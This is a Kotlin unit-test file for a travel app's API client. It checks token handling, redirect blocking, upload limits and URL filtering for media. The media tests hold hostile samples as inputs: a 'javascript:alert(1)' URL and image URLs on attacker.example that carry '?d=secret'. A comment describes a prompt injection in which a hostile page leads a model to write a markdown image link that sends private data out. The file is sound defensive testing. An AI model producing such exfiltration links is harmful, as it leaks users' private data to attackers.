package com.tongyou.travel

import com.tongyou.travel.data.*
import kotlinx.coroutines.runBlocking
import kotlinx.serialization.json.*
import okhttp3.OkHttpClient
import okhttp3.mockwebserver.*
import org.junit.*
import org.junit.Assert.*

class NativeApiTest {
    private lateinit var server: MockWebServer
    private lateinit var api: TravelApi
    private var rejected: String? = null
    @Before fun before() { server = MockWebServer(); server.start(); api = TravelApi({ "private-fixture" }, { rejected = it }, OkHttpClient.Builder().followRedirects(false).build(), server.url("/travel/api/")) }
    @After fun after() { server.shutdown() }
    @Test fun preservesProtocolAndRepeatedQueries() = runBlocking {
        server.enqueue(MockResponse().setBody("{\"ok\":true,\"future\":42}"))
        val reply = api.request("POST", "chat/test/messages", jsonBody("content" to "上海", "deep_reasoning" to true, "image_ids" to JsonArray(listOf(JsonPrimitive("img")))), listOf("destinations" to "上海", "destinations" to "杭州"))
        assertTrue(reply.obj()["ok"].bool())
        val request = server.takeRequest()
        assertEquals("Bearer private-fixture", request.getHeader("Authorization"))
        assertEquals(listOf("上海", "杭州"), request.requestUrl!!.queryParameterValues("destinations"))
        assertEquals("上海", wireJson.parseToJsonElement(request.body.readUtf8()).obj()["content"].string())
    }
    @Test fun loginDoesNotCarryAnOldToken() = runBlocking {
        server.enqueue(MockResponse().setBody("{}"))
        api.request("POST", "auth/login", authenticated = false)
        assertNull(server.takeRequest().getHeader("Authorization"))
    }
    @Test fun unauthorizedInvalidatesOnlyTheSentToken() = runBlocking {
        server.enqueue(MockResponse().setResponseCode(401).setBody("{\"detail\":\"expired\"}"))
        try { api.request("GET", "auth/me"); fail() } catch (e: ApiFailure) { assertEquals(401, e.status) }
        assertEquals("private-fixture", rejected)
    }
    @Test fun serverFailureKeepsSessionAndReadableDetail() = runBlocking {
        server.enqueue(MockResponse().setResponseCode(422).setBody("{\"detail\":[{\"msg\":\"金额错误\"}]}"))
        try { api.request("POST", "test"); fail() } catch (e: ApiFailure) { assertEquals("金额错误", e.message) }
        assertNull(rejected)
    }
    @Test fun redirectsAndAbsolutePathsCannotCarryTokenElsewhere() = runBlocking {
        server.enqueue(MockResponse().setResponseCode(302).addHeader("Location", "https://example.invalid/"))
        try { api.request("GET", "auth/me"); fail() } catch (e: ApiFailure) { assertEquals(302, e.status) }
        for (path in listOf("https://example.invalid", "/elsewhere", "../other")) {
            try { api.request("GET", path); fail() } catch (_: IllegalArgumentException) {}
        }
        assertEquals(1, server.requestCount)
    }
    @Test fun uploadsAreMultipartAndBounded() = runBlocking {
        server.enqueue(MockResponse().setBody("{\"id\":\"image-1\"}"))
        assertEquals("image-1", api.upload(byteArrayOf(1, 2), "image/png"))
        val request = server.takeRequest()
        assertTrue(request.getHeader("Content-Type")!!.startsWith("multipart/form-data"))
        assertTrue(request.body.readUtf8().contains("name=\"file\""))
        try { api.upload(ByteArray(10 * 1024 * 1024 + 1), "image/png"); fail() } catch (_: IllegalArgumentException) {}
    }
    @Test fun mediaDoesNotResolveExecutableOrProtocolRelativeUrls() {
        assertNull(TravelApi.media("javascript:alert(1)")); assertNull(TravelApi.media("//evil.example/image"))
        assertEquals("https://17tongyou.com/travel/api/uploads/abc", TravelApi.media("/api/uploads/abc"))
        assertTrue(TravelApi.media("https://store.is.autonavi.com/image.jpg")!!.contains("/api/img?u="))
    }
    @Test fun imagesFromUnknownHostsAreNeverLoadedDirectly() {
        // A model that read a hostile page can be made to write ![](https://attacker/?d=<private data>).
        for (url in listOf("https://attacker.example/x.png?d=secret", "http://attacker.example/x.png",
                           "https://autonavi.com.attacker.example/x.png", "https://17tongyou.com.attacker.example/a.png"))
            assertNull(url, TravelApi.media(url))
        assertEquals("https://17tongyou.com/travel/api/img?u=x", TravelApi.media("/travel/api/img?u=x"))
    }
    @Test fun oldScreenCannotSendAsANewAccountOrApplyAnOldResponse() = runBlocking {
        var token: String? = "old"
        val scoped = SessionService(api, "old") { token }
        token = "new"
        try { scoped.request("POST", "chat/a/messages"); fail() } catch (_: kotlinx.coroutines.CancellationException) {}
        assertEquals(0, server.requestCount)
        token = "old"
        server.enqueue(MockResponse().setBody("{}"))
        server.dispatcher = object : Dispatcher() {
            override fun dispatch(request: RecordedRequest): MockResponse { token = "new"; return MockResponse().setBody("{}") }
        }
        try { scoped.request("GET", "auth/me"); fail() } catch (_: kotlinx.coroutines.CancellationException) {}
        assertEquals(1, server.requestCount)
    }
}
